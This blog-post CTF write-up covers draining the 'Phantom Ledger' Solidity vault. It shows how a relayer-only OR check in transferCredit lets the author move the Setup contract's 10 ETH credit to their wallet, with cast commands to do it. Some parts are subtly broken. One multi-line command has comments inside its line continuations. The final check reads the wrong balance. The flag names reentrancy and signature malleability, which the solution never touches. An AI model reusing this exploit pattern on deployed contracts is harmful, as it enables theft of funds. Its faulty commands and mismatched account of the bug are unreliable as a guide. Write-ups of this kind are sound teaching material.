---
layout: post
title: "Phantom Ledger - Compfest26 CTF Writeup"
date: 2026-10-06 10:00:00 +0530
description: "CTF writeup for Phantom Ledger from Compfest CTF 2026"
categories: [Writeups, CTF, Web3 Security]
tags: [ctf, web3, solidity, compfest]
author: Sarayu
toc: true
---

Instance Details given to us:

RPC_URL, PRIVKEY, SETUP_CONTRACT_ADDR, WALLET_ADDR

## Solution

Firstly, lets look at the IsSolved() from Setup.sol

```javascript
function isSolved() external view returns (bool) {

return address(vault).balance == 0;

}
```

inorder to solve the challenge, we must drain the PhantomVault's contract balance to zero.

lets look at the things provided to us.

setup contract's constructor creates a phantom vault with 10eth, mapped to setup contract's address.

phantomVault's constructor:

```javascript
if (msg.value > 0) {

balances[msg.sender] += msg.value;

emit Deposit(msg.sender, msg.value);

}

}
```

so, the phantomvault has

- balances recorded/mapped: setup's addr --> 10 eth

initially.

lets look at the PhantomVault.

functions to analyse:

- withdraw: checks balances[msg.sender] >= amount and pays accordingly with proper CEI(Checks,Effects,Interactions) and a nonReentrant lock.
- transferCredit : changes internal accounting of mapped balances and addresses
- relayWithdraw : locked to only relayer, the relayer withdraws the amount

the require check in transfercredit:

```javascript
require(msg.sender == from || msg.sender == relayer, "Not authorized");
```

since the check allows either one(OR condition) 'from' address or the 'relayer' to be msg.sender,

Relayer is the one which withdraws on behalf of someone who signed a message. It has signature verification, which is done using the _recoverSigner() function. For more information, refer to EIP-712.

Luckily, the Setup contract gave us the `relayer` role when it deployed the vault. As the `relayer`, we can call `transferCredit` and set `from` to the `Setup` contract's address (which has 10 ETH mapped to it).

Executing the Attack:

we found the vulnerability in the transfercredit function, which can be used

1. We set `to` to our own wallet address.
2. We transfer the full `10 ETH` from the `Setup`'s internal balance to **our** internal balance, using the transferCredit function.
3. Now our balance inside the vault is `10 ETH`.
4. We call the normal `withdraw` function to pull out the real ETH into our wallet.
5. The vault's real ETH balance becomes `0` , satisfying the IsSolved() condition.

#### > Find the vault address

The `Setup` contract has a public variable `vault`. We call it to get the address where our `PhantomVault` is deployed.

```bash
cast call 0xe772E378E717e18CBbf4b49EF9e7983a0BEE0941 \
  "vault()(address)" \
  --rpc-url "$RPC_URL"
```

- **Result**: `0x685a0638DeaCb8C615be777c1d71bFe40Dfc4270` (Let's call this `VAULT_ADDR`).

#### > Transfer the credit from Setup to us

We call `transferCredit(from=Setup, to=Us, amount=10e18)`.

```bash
cast send 0x685a0638DeaCb8C615be777c1d71bFe40Dfc4270 \
  "transferCredit(address,address,uint256)" \
  0xe772E378E717e18CBbf4b49EF9e7983a0BEE0941 \
  # The 'from' (Setup)
  0x0e4e6C10518978bdef7c0D942FD0CC29b65292d9 \
  # The 'to' (Us)
  10000000000000000000 \
  # 10 ETH
  --private-key $PRIVKEY \
  --rpc-url "$RPC_URL"
```

- Here, `msg.sender` is our address. The `require` check sees `msg.sender == relayer` (which is true), so it allows us to move the Setup contract's balance.

#### > Withdraw the ETH to our wallet

Now that our internal balance is `10 ETH`, we call `withdraw`.

```bash
cast send 0x685a0638DeaCb8C615be777c1d71bFe40Dfc4270 \
  "withdraw(uint256)" \
  10000000000000000000 \
  --private-key $PRIVKEY \
  --rpc-url "$RPC_URL"
```

The vault sends us the 10 ETH.

checking the vault's balance:

```bash
cast call 0x685a0638DeaCb8C615be777c1d71bFe40Dfc4270 "getBalance(address)(uint256)" 0x0e4e6C10518978bdef7c0D942FD0CC29b65292d9 --rpc-url "$RPC_URL"
```

Output: `0`

---

The vault is now empty, and IsSolved() returns true.

flag: COMPFEST18{ph4nt0m_l3dg3r_cr0ss_funct10n_r33ntr4ncy_w1th_ecdsa_m4ll3ab1l1ty}